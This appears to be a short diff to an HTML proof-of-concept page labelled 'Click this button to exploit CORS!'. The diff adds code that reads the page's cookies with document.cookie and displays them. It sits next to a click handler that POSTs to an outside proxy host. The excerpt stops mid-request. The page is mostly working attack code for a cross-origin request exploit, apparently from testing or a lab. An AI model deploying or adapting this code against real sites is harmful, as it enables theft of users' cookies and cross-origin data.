@@ -7,10 +7,17 @@
   <h1>Click this button to exploit CORS!</h1>
   <button id="exploitButton">Exploit</button>
 
+  <div id="cookies"></div> <!-- Placeholder for displaying the cookies -->
   <div id="response"></div> <!-- Placeholder for displaying the response -->
 
   <script>
     document.getElementById('exploitButton').addEventListener('click', function() {
+      // Display the cookies before the server response
+      const cookies = document.cookie;  // Get the cookies for the current domain
+      const cookiesDiv = document.getElementById('cookies');
+      cookiesDiv.innerHTML = `<h2>Cookies:</h2><pre>${cookies}</pre>`;
+      
+      // Proceed with fetching the server response
       fetch('https://testingphase-74fh.onrender.com/proxy', {
         method: 'POST',
         body: JSON.stringify({
